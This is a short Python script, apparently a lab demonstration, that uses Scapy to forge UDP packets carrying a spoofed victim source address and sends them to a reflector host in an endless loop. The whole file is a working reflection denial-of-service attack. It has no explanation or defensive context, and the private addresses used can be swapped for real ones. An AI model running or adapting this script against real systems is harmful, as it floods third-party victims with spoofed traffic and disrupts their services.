from scapy.all import *

victim_ip = "192.168.100.20"
reflector_ip = "192.168.100.30"

packet = IP(src=victim_ip, dst=reflector_ip)/UDP(dport=9999)/Raw(load="test")
send(packet, loop=1)
